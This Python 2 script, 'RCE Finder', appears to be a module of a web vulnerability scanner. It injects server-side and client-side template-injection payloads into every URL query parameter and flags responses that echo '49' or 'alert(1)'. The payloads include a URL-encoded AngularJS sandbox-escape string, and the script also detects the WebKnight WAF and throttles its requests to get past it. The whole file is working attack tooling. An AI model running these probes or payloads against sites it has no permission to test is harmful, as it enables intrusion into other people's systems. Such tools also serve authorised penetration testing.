#!/usr/bin/env python
# RCE Finder
# By Rudra Sarkar - twitter.com/rudr4_sarkar
import urllib
import re
from header import *


def main_function(url, payloads, check):
        opener = urllib.urlopen(url)
	vuln = 0
        if opener.code == 999:
                # Detetcing the WebKnight WAF from the StatusCode.
                print ga.red +" [~] WebKnight WAF Detected!"+ga.end
                print ga.red +" [~] Delaying 3 seconds between every request"+ga.end
                time.sleep(3)
        for params in url.split("?")[1].split("&"):
            for payload in payloads:
                bugs = url.replace(params, params + str(payload).strip())
                request = useragent.open(bugs)
		html = request.readlines()
                for line in html:
                    checker = re.findall(check, line)
                    if len(checker) !=0:
                        print "\n"
                        print ga.green+" [+] Vulnerablity Found . . ."+ga.end
                        print ga.yellow+" [+] Payload: " ,payload +ga.end
                        print ga.green+" [+] POC: "+ga.end + bugs
                        vuln +=1
        if vuln == 0:                
        	print ga.red+" [!] Target is not vulnerable at Template Injection!"+ga.end
        else:
        	print ga.yellow+"\n [+] Total %i Template Injection Found" % (vuln) +ga.end

# Template Injection Injecting
def rce_func(url):
  	print ga.bold+"\n [!] Finding for Template Injection "+ga.end
  	print ga.yellow+" [!] Please wait ...."+ga.end
  	# Remote Code Injection Payloads
  	payloads = ['wrtz%7B%7B%28_%3D%22%22.sub%29.call.call%28%7B%7D%5B%24%3D%22%5Cconstructor%22%5D.getOwnPropertyDescriptor%28_.__proto__%2C%24%29.value%2C0%2C%22alert%281%29%22%29%28%29%7D%7Dzzz%5C', '{{7*7}}', 'Hello%20${7*7}']

  	# used re.I to fix the case sensitve issues like "payload" and "PAYLOAD".
  	check = re.compile("alert(1)|49|Hello 49", re.I)
  	main_function(url, payloads, check)

